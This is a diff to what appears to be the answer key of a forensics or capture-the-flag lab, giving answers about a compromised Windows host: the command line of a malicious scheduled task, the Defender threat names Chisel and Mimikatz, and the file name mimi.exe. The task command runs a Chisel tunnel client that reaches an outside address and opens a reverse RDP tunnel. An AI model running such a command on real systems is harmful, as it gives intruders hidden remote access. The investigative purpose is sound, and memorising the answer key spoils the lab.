@@ -85,3 +85,17 @@ Answer is: At system startup
 Task 6-4
 What is the full command line of the malicious task?
 Answer is: C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389
+
+=====
+
+Task 7-1
+What is the threat family ("Name") of the first quarantined file? 
+Answer is: VirTool:Win64/Chisel.G
+
+Task 7-2
+And what is the threat family of the next detected malware?
+Answer is: HackTool:Win32/Mimikatz!pz
+
+Task 7-3
+What is the file name of the downloaded Mimikatz executable?
+Answer is: mimi.exe
